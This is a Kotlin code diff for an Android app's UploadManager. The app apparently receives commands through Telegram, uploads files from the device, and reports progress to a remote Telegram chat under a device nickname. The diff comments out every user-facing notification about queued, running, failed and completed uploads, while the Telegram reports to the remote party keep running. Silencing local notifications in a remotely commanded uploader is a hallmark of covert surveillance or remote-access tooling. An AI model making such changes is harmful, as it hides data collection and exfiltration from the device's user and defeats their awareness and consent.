@@ -101,7 +101,7 @@ object UploadManager {
             )
             val id = dao.insert(upload)
             Log.d("UploadManager", "Queued upload: $upload (db id: $id)")
-            showNotification("Queued: $type", "Preparing to upload ${file.name}")
+            // showNotification("Queued: $type", "Preparing to upload ${file.name}")
             sendTelegramMessage(chatId, "[${getDeviceNickname()}] Command received: $type. Processing...")
             uploadAllPending()
         }
@@ -116,11 +116,11 @@ object UploadManager {
             if (!file.exists() || file.length() == 0L) {
                 dao.delete(upload)
                 Log.d("UploadManager", "Skipped upload (file missing): $upload")
-                showNotification("Skipped: ${upload.type}", "File missing: ${file.name}")
+                // showNotification("Skipped: ${upload.type}", "File missing: ${file.name}")
                 sendTelegramMessage(upload.chatId, "[${getDeviceNickname()}] Error: File missing for ${upload.type} at ${formatDateTime(upload.actionTimestamp)}")
                 continue
             }
-            showNotification("Uploading: ${upload.type}", "Uploading ${file.name}")
+            // showNotification("Uploading: ${upload.type}", "Uploading ${file.name}")
             Log.d("UploadManager", "Uploading file: ${file.absolutePath} for upload record $upload")
             val success: Boolean = try {
                 when (upload.type) {
@@ -131,7 +131,7 @@ object UploadManager {
                 }
             } catch (e: Exception) {
                 Log.e("UploadManager", "Upload error: ${e.localizedMessage}", e)
-                showNotification("Upload Error", "Error uploading ${file.name}: ${e.localizedMessage}")
+                // showNotification("Upload Error", "Error uploading ${file.name}: ${e.localizedMessage}")
                 sendTelegramMessage(upload.chatId, "[${getDeviceNickname()}] Error uploading ${upload.type}: ${e.localizedMessage} at ${formatDateTime(upload.actionTimestamp)}")
                 false
             }
@@ -143,9 +143,9 @@ object UploadManager {
                 Log.d("UploadManager", "Upload complete and deleted: $upload")
                 Log.d("UploadManager", "Triggering CommandManager to check for next eligible command after upload $upload")
                 CommandManager.triggerQueueProcess()
-                showNotification("Upload Success", "${upload.type.replaceFirstChar { it.uppercase() }} uploaded: ${file.name}")
+                // showNotification("Upload Success", "${upload.type.replaceFirstChar { it.uppercase() }} uploaded: ${file.name}")
             } else {
-                showNotification("Upload Failed", "${file.name} could not be uploaded.")
+                // showNotification("Upload Failed", "${file.name} could not be uploaded.")
                 Log.d("UploadManager", "Upload failed for: $upload")
             }
         }
@@ -323,8 +323,10 @@ object UploadManager {
         }
     }
 
+    /*
     private fun showNotification(title: String, text: String) {
         NotificationHelper.showNotification(appContext, title, text, id = 2001)
         Log.d("UploadManager", "showNotification: $title - $text")
     }
+    */
 }
